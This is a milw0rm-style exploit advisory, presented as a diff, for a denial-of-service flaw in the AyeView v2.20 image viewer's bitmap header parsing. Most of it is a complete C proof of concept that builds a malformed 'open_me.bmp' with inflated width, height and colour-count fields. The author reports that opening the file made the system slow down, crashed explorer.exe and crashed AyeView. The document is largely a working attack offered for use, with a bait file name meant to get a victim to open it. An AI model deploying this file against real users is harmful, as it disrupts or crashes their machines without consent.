@@ -1,0 +1,98 @@
+Name      : AyeView v2.20 (invalid bitmap header parsing) DoS Exploit
+Credit    : suN8Hclf (DaRk-CodeRs Group), crimson.loyd@gmail.com
+Download: : http://www.ayeview.com/downloads.htm
+Greetz    : Luigi Auriemma, 0in, cOndemned, e.wiZz!, Gynvael Coldwind, 
+            Katharsis, str0ke, all from #dark-coders and others;]
+
+Short Desc:
+AyeView v2.20 software does not properly parse values in bmp file header.
+In fact it does it good but it does not check if these values are "reasonable".
+Therefore we can create a special bitmap, that will slow down or even
+suspend the entire system. I have written a PoC that enforce AyeView
+to allocate large amounts of memory. Short history:
+
+First start of exploit      ->  the system really slowed down
+Second start(another values)->  I got a message that "the amount of virtual memory
+                                is too low", explorer.exe crashed
+Third start(another values) ->  AyeView crashed
+
+PoC:
+------------------------------exploit---------------------------
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+
+struct bmpfile_header{
+    short bfType;
+    int bfSize;
+    int Res;
+    int bfOffBits;
+    int biSize;
+    int biWidth;
+    int biHeight;
+    short biPlanes;
+    short biBitCount;
+    int biCompression;
+    int biSizeImage;
+    int biXPelsPerMeter;
+    int biYPelsPerMeter;
+    int biClrUsed;
+    char biClrImportant;
+    char biClrRotation;
+    short biReserved;
+}__attribute__((packed)); //shift to 54 bytes
+
+
+#define WIDTH 3000       //play around with these values...
+#define HEIGHT 60000
+#define Y 44432
+#define X 54444
+
+int main(int argc, char *argv[])
+{
+	struct bmpfile_header *bmpheader;
+	char *memory;
+	FILE *f;
+	
+	memory=(char *)malloc(60);
+	if(memory==NULL){
+		perror("malloc");
+		return -1;
+	}
+	memset(memory, 0, 60);
+	bmpheader=(struct bmpfile_header *)memory;
+	printf("[+]Building bitmap... :)\n");
+	bmpheader->bfType=*(short *)"BM";
+	bmpheader->bfSize=(int)60;
+	bmpheader->Res=0;
+	bmpheader->bfOffBits=54;
+	bmpheader->biSize=40;
+	bmpheader->biHeight=(int)HEIGHT;
+	bmpheader->biWidth=(int)WIDTH;
+	bmpheader->biPlanes=1;
+	bmpheader->biBitCount=24;
+	bmpheader->biCompression=0;
+	bmpheader->biSizeImage=6;
+	bmpheader->biXPelsPerMeter=(int)X;
+	bmpheader->biYPelsPerMeter=(int)Y;
+	bmpheader->biClrUsed=255*255*255;
+	bmpheader->biClrImportant=0;
+	bmpheader->biClrRotation=0;
+	
+	f=fopen("open_me.bmp", "wb");
+    	if(!f){
+           perror("fopen");
+           free(memory);
+           exit(-1);
+    	}
+    	fwrite(memory, 1, 60, f);
+    	fclose(f); 
+	printf("[+]open_me.bmp bitmap created :)\n");
+	free(memory);
+	return 0;
+}
+------------------------------exploit---------------------------
+
+Stay secure...
+
+# milw0rm.com [2008-10-05]
